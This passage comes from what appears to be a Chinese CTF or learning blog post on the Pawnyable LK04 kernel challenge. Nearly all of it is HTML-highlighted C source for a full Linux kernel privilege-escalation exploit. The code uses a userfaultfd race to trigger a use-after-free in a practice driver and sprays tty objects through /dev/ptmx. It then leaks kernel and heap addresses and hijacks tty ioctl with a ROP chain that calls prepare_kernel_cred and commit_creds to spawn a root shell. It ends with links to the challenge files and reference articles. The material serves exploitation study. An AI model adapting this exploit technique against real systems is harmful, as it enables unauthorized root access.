id<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_GET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    req<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_SET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>copy_page <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> uffdio_copy<span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> arg<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pollfd</span> pollfd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>    pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>    <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] fault_handler_thread waiting for page fault..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR <span class="token operator">||</span> pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLHUP<span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"revents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"read msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>event <span class="token operator">!=</span> UFFD_EVENT_PAGEFAULT<span class="token punctuation">)</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Unexpected event on userfaultfd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[t][*] fault_handler_thread(): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"POLLIN = %d; POLLERR = %d\n"</span><span class="token punctuation">,</span>                 <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLIN<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>pollfd<span class="token punctuation">.</span>revents <span class="token operator">&amp;</span> POLLERR<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[t][*] UFFD_EVENT_PAGEFAULT event: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flags = %llx; "</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>flags<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"address = %llx\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>fault_cnt<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[t][*] UAF read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">del</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[t][*] UAF write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">del</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Unexpected page fault"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>        uffdio_copy<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> copy_page<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>dst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> msg<span class="token punctuation">.</span>arg<span class="token punctuation">.</span>pagefault<span class="token punctuation">.</span>address<span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        uffdio_copy<span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_COPY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_copy<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_COPY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/fleckvieh"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>page<span class="token punctuation">;</span>  page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span>              MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    copy_page <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token function">registerUserFaultFd</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>fault_handler_thread<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//------leak koff</span>    victim <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">get</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> page<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x60</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token operator">-</span><span class="token number">0xc3c3c0</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">close</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//-----leak kheap</span>    victim <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">get</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> page<span class="token operator">+</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x60</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x1000</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">size_t</span> kheap<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x1000</span><span class="token operator">+</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x38</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] kheap => 0x%lx\n"</span><span class="token punctuation">,</span> kheap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">close</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//------ropchain</span>    prepare_kernel_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>    commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>    swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSD_RET<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>    ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span>    <span class="token comment">//------fake_tty</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>fake_tty <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_tty<span class="token punctuation">,</span> page<span class="token operator">+</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fake_tty<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x0000000100005401</span><span class="token punctuation">;</span><span class="token comment">//magic</span>    fake_tty<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//driver</span>    fake_tty<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> kheap<span class="token punctuation">;</span><span class="token comment">//ops->ioctl</span>    fake_tty<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> PUSH_RDX_CMP_EAX_0x415b005c_POP_RSP_RBP_RET<span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fake_tty<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    victim <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    copy_page <span class="token operator">=</span> buf<span class="token punctuation">;</span>    <span class="token function">set</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> page<span class="token operator">+</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x60</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x2000</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>            <span class="token comment">//attack</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">ioctl</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> kheap <span class="token operator">+</span> <span class="token number">0x20</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/b378e4cf01ab26aef803763b52011041_MD5.jpeg"></p><blockquote><p>附件：<a href="https://pawnyable.cafe/linux-kernel/LK04/distfiles/LK04.tar.gz">LK04.tar.gz</a><br>参考文章：<a href="https://blog.wohin.me/posts/pawnyable-0303/">Linux Kernel PWN | 040303 Pawnyable之userfaultfd (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK04/uffd.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">使用 